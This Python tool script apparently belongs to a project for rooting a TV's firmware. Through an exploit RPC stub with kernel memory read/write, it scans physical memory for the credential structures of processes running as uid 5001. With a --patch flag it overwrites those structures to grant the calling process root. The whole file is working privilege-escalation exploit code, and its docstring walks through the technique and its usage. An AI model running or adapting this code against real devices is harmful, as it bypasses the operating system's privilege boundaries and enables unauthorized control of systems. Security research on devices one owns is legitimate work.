"""Find and patch creds by their CONTENT - no task list, no symbols, no comm.

Why this exists: on this firmware the kernel task list is damaged within seconds
of boot (`init.tasks.prev` dies at hop 5-17 with a non-pointer), and freshly
allocated task_structs routinely read back as 0xff fill, so every walk-based
locator (comm tag, pid hash, IDR) eventually fails. A `struct cred` for an owner
process, however, holds

    ids = (5001, 100, 5001, 100, 5001, 100, 5001, 100)   at cred+4

which is 32 bytes that cannot occur by accident. Scanning lowmem for that
pattern and reading the refcount at `cred` finds the creds of every uid-5001
process on the box; patching them gives the caller root without needing to know
which task it is.

Usage (server on :80 with a live stub - see docs/EXPLOIT.md):
    python tools/scan_cred.py                      # report only, 0x20000000-0x40000000
    python tools/scan_cred.py --patch              # patch every plausible cred
    python tools/scan_cred.py 0x20000000 0x30000000 --patch --usage=8

Safety notes:
  * the scan is bounded to 0x40000000 by default: two full scans of this TV both
    hung at phys 0x46000000 (one was followed by a reboot). Do not widen without
    a reason.
  * a 32-byte match can still be noise, so the refcount at cred must be sane;
    implausible values are skipped and reported.
  * patching is reversible with a reboot; `getuid()` inside the target process is
    the only proof that the right cred was hit.
"""
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import physmap as T          # noqa: E402
import kernel_root as K      # noqa: E402

PAT = K.OWNER_PAT
PAGE = K.PAGE
BATCH = 4096
DEFAULT_STOP = 0x40000000


def main():
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    start = int(args[0], 0) if len(args) > 0 else T.RAM_LO
    stop = int(args[1], 0) if len(args) > 1 else DEFAULT_STOP
    do_patch = "--patch" in sys.argv
    min_usage = 2
    for a in sys.argv:
        if a.startswith("--usage="):
            min_usage = int(a.split("=", 1)[1])

    rpc = T.RPC(timeout=20)
    hits = set()
    try:
        t0 = time.time()

        def progress(page, scanned, n):
            print(f"    ... {T.hexs(page)} {scanned} pg {time.time() - t0:.0f}s "
                  f"{n} hits", flush=True)

        for cred in K.iter_owner_creds(rpc, start, stop, BATCH, progress=progress):
            hits.add(cred)
        print(f"[*] {len(hits)} cred candidates in {time.time() - t0:.0f}s", flush=True)

        rows = []
        for cred in sorted(hits):
            try:
                rows.append((cred, T.u32(rpc.read(cred, 4))))
            except Exception:
                rows.append((cred, -1))
        for cred, usage in rows:
            print(f"    cred {T.hexs(cred)} usage={usage}", flush=True)

        if not do_patch:
            print("[*] report only; pass --patch to root these", flush=True)
            return 0

        n = 0
        for cred, usage in rows:
            if usage < min_usage or usage > 65536:
                if usage > 65536:
                    print(f"[!] skip {T.hexs(cred)}: implausible usage {usage}", flush=True)
                continue
            if K.patch_full(rpc, cred):
                n += 1
                print(f"[*] patched {T.hexs(cred)} (usage {usage})", flush=True)
        print(f"[*] patched {n} creds - verify with getuid() in the target process",
              flush=True)
        return 0
    finally:
        rpc.close()


if __name__ == "__main__":
    sys.exit(main())
